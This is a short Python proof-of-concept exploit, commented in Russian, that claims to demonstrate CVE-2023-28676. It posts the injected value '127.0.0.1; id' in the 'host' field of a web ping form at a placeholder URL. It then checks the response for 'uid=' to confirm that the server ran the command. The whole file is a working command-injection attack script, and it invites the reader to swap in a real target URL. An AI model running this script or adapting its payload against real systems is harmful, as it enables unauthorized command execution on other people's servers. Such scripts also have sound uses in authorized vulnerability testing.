# PoC для демонстрации CVE-2023-28676 (Command Injection в веб‑приложении)
# Автор: [Ваше имя]
# Дата: [Текущая дата]

import requests
import sys

# Конфигурация
TARGET_URL = "http://vulnerable-site.com/ping"  # Замените на целевой URL
PAYLOAD = "127.0.0.1; id"  # Попытка выполнить команду 'id'

def test_vulnerability(url, payload):
    """
    Функция для тестирования уязвимости Command Injection.
    Отправляет запрос с payload и анализирует ответ.
    """
    try:
        # Формируем данные для отправки
        data = {
            'host': payload,  # Поле, подверженное инъекции
            'submit': 'Ping'  # Кнопка отправки
        }

        # Отправляем POST‑запрос
        response = requests.post(url, data=data, timeout=10)

        # Проверяем ответ
        if response.status_code == 200:
            # Ищем признаки выполнения команды (например, строку 'uid=')
            if 'uid=' in response.text.lower():
                print("[+] Уязвимость CVE-2023-28676 потенциально подтверждена!")
                print("[+] Обнаружены признаки выполнения команды:")
                print(response.text[:500])  # Выводим первые 500 символов ответа
            else:
                print("[-] Уязвимость не подтверждена. Ответ сервера не содержит признаков выполнения команды.")
                print(f"[-] Код ответа: {response.status_code}")
        else:
            print(f"[-] Ошибка: сервер вернул код {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при выполнении запроса: {e}")

if __name__ == "__main__":
    print("Запуск PoC для CVE-2023-28676...")
    print(f"Цель: {TARGET_URL}")
    print(f"Payload: {PAYLOAD}")
    print("-" * 50)
    test_vulnerability(TARGET_URL, PAYLOAD)
